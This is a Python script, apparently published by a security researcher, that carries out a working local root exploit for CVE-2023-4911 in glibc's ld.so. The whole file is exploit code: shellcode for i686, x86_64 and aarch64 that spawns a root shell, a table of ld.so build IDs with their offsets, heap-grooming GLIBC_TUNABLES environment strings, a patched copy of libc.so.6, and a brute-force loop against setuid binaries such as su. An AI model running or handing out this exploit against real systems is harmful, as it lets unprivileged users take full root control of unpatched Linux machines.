#
# gnu-acme.py
# ------------------------------------------------------------------------------
# my (bad) attempt at a CVE-2023-4911 exploit
# based on the advisory[1] by Qualys and thumb sucking
#
# if you disable aslr (echo 0 > /proc/sys/kernel/randomize_va_space) it will
# attempt to identify a workable offset for your ld.so, you can add it to TARGETS
#
# tested on glibc 2.35-0ubuntu3 (aarch64) and glibc 2.36-9+deb12u2 (amd64)
#
# enjoy, maybe? and don't ask for support :)
#
# -- blasty <peter@haxx.in>
#
# [1]: https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt
#

import binascii
import resource
import struct
import select
import time

import sys
import os

from ctypes import *
from ctypes.util import find_library
from shutil import which

unhex = lambda v: binascii.unhexlify(v.replace(" ", ""))

# setresuid(euid, euid, euid); execve("/bin/sh", ["sh", NULL], NULL);
# exit(0x66)
ARCH = {
    "i686": {
        "shellcode": unhex(
            "6a3158cd8089c36a465889d9cd80"
            + "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80"
        ),
        "exitcode": unhex("6a665b6a0158cd80"),
        "stack_top": 0xC0000000,
        "stack_aslr_bits": 23,
    },
    "x86_64": {
        "shellcode": unhex(
            "6a6b580f0589c789c289c66a75580f05"
            + "6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05"
        ),
        "exitcode": unhex("6a665f6a3c580f05"),
        "stack_top": 0x800000000000,
        "stack_aslr_bits": 34,
    },
    "aarch64": {
        "shellcode": unhex(
            "e81580d2010000d4e10300aae20300aa681280d2010000d4"
            + "ee458cd22ecdadf2eee5c5f2ee65eef20f0d80d2ee3fbfa9e0030091e1031faae2031faaa81b80d2010000d4"
        ),
        "exitcode": unhex("c00c80d2a80b80d2010000d4"),
        "stack_top": 0x1000000000000,
        "stack_aslr_bits": 30,
    },
}

TARGETS = {
    "69c048078b6c51fa8744f3d7cff3b0d9369ffd53": 561,
    "3602eac894717d56555552c84fc6b0e4d6a4af72": 561,
    "a99db3715218b641780b04323e4ae5953d68a927": 561,
    "35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc": 561,
    "a8daca28288575ffc8c7641d40901b0148958fb1": 580,
    "61ef896a699bb1c2e4e231642b2e1688b2f1a61e": 560,
    "9a9c6aeba5df4178de168e26fe30ddcdab47d374": 580,
    "e7b1e0ff3d359623538f4ae0ac69b3e8db26b674": 580,
    "956d98a11b839e3392fa1b367b1e3fdfc3e662f6": 322,
}

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
resource.setrlimit(
    resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
)


def error(s):
    print("error: %s" % s)
    exit(-1)


def find_hax_path(blob, offset):
    pos = offset
    while pos > 0:
        if blob[pos] != 0 and blob[pos] != 0x2F and blob[pos + 1] == 0:
            return {"path": bytes([blob[pos]]), "offset": pos - offset}
        pos = pos - 1
    return None


def lolstruct(format, keys, data):
    return dict(zip(keys.split(" "), struct.unpack(format, data)))


def lib_path(libname):
    class LINKMAP(Structure):
        _fields_ = [("l_addr", c_void_p), ("l_name", c_char_p)]

    lib = CDLL(find_library("c"))
    libdl = CDLL(find_library("dl"))
    dlinfo = libdl.dlinfo
    dlinfo.argtypes = c_void_p, c_int, c_void_p
    dlinfo.restype = c_int
    lmptr = c_void_p()
    dlinfo(lib._handle, 2, byref(lmptr))
    return cast(lmptr, POINTER(LINKMAP)).contents.l_name


def execve(filename, cargv, cenvp):
    libc.execve(filename, cargv, cenvp)


def spawn(filename, argv, envp):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(envp))(*envp)
    # execve(filename, cargv, cenvp)
    # exit(0)

    child_pid = os.fork()

    # child
    if not child_pid:
        execve(filename, cargv, cenvp)
        exit(0)

    # parent
    start_time = time.time()
    while True:
        try:
            pid, status = os.waitpid(child_pid, os.WNOHANG)
            if pid == child_pid:
                if os.WIFEXITED(status):
                    return os.WEXITSTATUS(status) & 0xFF7F
                else:
                    return 0
        except:
            pass
        current_time = time.time()
        if current_time - start_time >= 1.5:
            print("** ohh... looks like we got a shell? **\n")
            os.waitpid(child_pid, 0)
            return 0x1337


class lazy_elf:
    def __init__(self, filename):
        self.d = open(filename, "rb").read()
        self.bits = 64 if self.d[4] == 2 else 32

        eh_size = 0x30 if self.bits == 64 else 0x24

        self.h = lolstruct(
            "<HHLQQQLHHHHHH" if self.bits == 64 else "<HHLLLLLHHHHHH",
            "type machine version entry phoff shoff flags ehsize "
            + "phtentsize phnum shentsize shnum shstrndx",
            self.d[0x10 : 0x10 + eh_size],
        )
        shstr = self.shdr(self.h["shstrndx"])
        self.section_names = self.d[shstr["offset"] : shstr["offset"] + shstr["size"]]

    def shdr(self, idx):
        pos = self.h["shoff"] + (idx * self.h["shentsize"])
        return lolstruct(
            "<LLQQQQLLQQ" if self.bits == 64 else "<LLLLLLLLLL",
            "name type flags addr offset size link info addralign entsize",
            self.d[pos : pos + self.h["shentsize"]],
        )

    def shdr_by_name(self, name):
        name = name.encode()
        for i in range(self.h["shnum"]):
            shdr = self.shdr(i)
            if self.section_names[shdr["name"] :].split(b"\x00")[0] == name:
                return shdr
        return None

    def section_by_name(self, name):
        s = self.shdr_by_name(name)
        return self.d[s["offset"] : s["offset"] + s["size"]]

    def symbol(self, name):
        name = name.encode()
        dynsym = self.section_by_name(".dynsym")
        dynstr = self.section_by_name(".dynstr")
        sym_size = 24 if self.bits == 64 else 16
        for i in range(len(dynsym) // sym_size):
            pos = i * sym_size
            if self.bits == 64:
                sym = lolstruct(
                    "<LBBHQQ",
                    "name info other shndx value size",
                    dynsym[pos : pos + sym_size],
                )
            else:
                sym = lolstruct(
                    "<LLLBBH",
                    "name value size info other shndx",
                    dynsym[pos : pos + sym_size],
                )
            if dynstr[sym["name"] :].split(b"\x00")[0] == name:
                return sym["value"]
        return None


def is_aslr_enabled():
    return int(open("/proc/sys/kernel/randomize_va_space", "r").read()) > 0


def build_env(adjust, addr, offset, bits=64):
    # heap meh shui
    if bits == 64:
        env = [
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"P" * adjust,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 8,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"Y" * 24,
        ]

        pad = 172
        fill = 47
    else:
        env = [
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"P" * adjust,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"X" * 14,
        ]

        pad = 87
        fill = 47 * 2

    for j in range(pad):
        env.append(b"")

    if bits == 64:
        env.append(struct.pack("<Q", addr))
        env.append(b"")
    else:
        env.append(struct.pack("<L", addr))

    for i in range(384):
        env.append(b"")

    for i in range(fill):
        if bits == 64:
            env.append(
                struct.pack("<Q", offset & 0xFFFFFFFFFFFFFFFF) * 16382 + b"\xaa" * 7
            )
        else:
            env.append(struct.pack("<L", offset & 0xFFFFFFFF) * 16382 + b"\xaa" * 7)

    env.append(None)
    return env


def build_argv(args):
    argv = []
    for arg in args:
        if len(argv) == 0:
            arg = os.path.basename(arg)
        argv.append(arg.encode())
    argv.append(None)
    return argv


def banner():
    print("")
    print("      $$$ glibc ld.so (CVE-2023-4911) exploit $$$")
    print("            -- by blasty <peter@haxx.in> --      ")
    print("")


if __name__ == "__main__":
    banner()

    machine = os.uname().machine

    if machine not in ARCH.keys():
        error("architecture '%s' not supported" % machine)

    print("[i] libc = %s" % lib_path("c").decode())

    if len(sys.argv) == 1:
        suid_path = which("su")
        suid_args = ["--help"]
    else:
        suid_path = sys.argv[1]
        suid_args = sys.argv[2:]

    lsb = ((0x100 - (len(suid_path) + 1 + 8)) & 7) + 8

    print("[i] suid target = %s, suid_args = %s" % (suid_path, suid_args))

    suid_e = lazy_elf(suid_path)

    ld_path = suid_e.section_by_name(".interp").strip(b"\x00").decode()

    ld_e = lazy_elf(ld_path)

    print("[i] ld.so = %s" % ld_path)

    ld_build_id = binascii.hexlify(
        ld_e.section_by_name(".note.gnu.build-id")[-20:]
    ).decode()

    print("[i] ld.so build id = %s" % ld_build_id)

    libc_e = lazy_elf(lib_path("c"))

    __libc_start_main = libc_e.symbol("__libc_start_main")

    if __libc_start_main == None:
        error("could not resolve __libc_start_main")

    print("[i] __libc_start_main = 0x%x" % __libc_start_main)

    offset = suid_e.shdr_by_name(".dynstr")["offset"]
    hax_path = find_hax_path(suid_e.d, offset)

    if hax_path is None:
        error("could not find hax path")

    print(
        "[i] using hax path %s at offset %d"
        % (
            hax_path["path"],
            hax_path["offset"],
        )
    )

    if not os.path.exists(hax_path["path"]):
        os.mkdir(hax_path["path"])

    argv = build_argv([suid_path] + suid_args)

    shellcode = (
        ARCH[machine]["shellcode"] if is_aslr_enabled() else ARCH[machine]["exitcode"]
    )

    with open(hax_path["path"] + b"/libc.so.6", "wb") as fh:
        fh.write(libc_e.d[0:__libc_start_main])
        fh.write(shellcode)
        fh.write(libc_e.d[__libc_start_main + len(shellcode) :])
    print("[i] wrote patched libc.so.6")

    if not is_aslr_enabled():
        print("[i] ASLR is not enabled, attempting to find usable offsets")

        stack_addr = ARCH[machine]["stack_top"] - 0x1F00
        stack_addr += lsb

        print("[i] using stack addr 0x%x" % stack_addr)

        for adjust in range(128, 1024):
            env = build_env(adjust, stack_addr, hax_path["offset"], suid_e.bits)
            r = spawn(suid_path.encode(), argv, env)
            if r == 0x66:
                print(
                    "found working offset for ld.so '%s' -> %d" % (ld_build_id, adjust)
                )

    else:
        if ld_build_id not in TARGETS.keys():
            error("no target info found for build id %s" % ld_build_id)

        stack_addr = ARCH[machine]["stack_top"] - (
            1 << (ARCH[machine]["stack_aslr_bits"] - 1)
        )
        stack_addr += lsb
        # avoid NULL bytes in guessy addr (out of sheer laziness really)
        for i in range(6 if suid_e.bits == 64 else 4):
            if (stack_addr >> (i * 8)) & 0xFF == 0:
                stack_addr |= 0x10 << (i * 8)

        print("[i] using stack addr 0x%x" % stack_addr)

        env = build_env(
            TARGETS[ld_build_id], stack_addr, hax_path["offset"], suid_e.bits
        )

        cnt = 1
        while True:
            if cnt % 0x10 == 0:
                sys.stdout.write(".")
                sys.stdout.flush()
            if spawn(suid_path.encode(), argv, env) == 0x1337:
                print("goodbye. (took %d tries)" % cnt)
                exit(0)
            cnt += 1
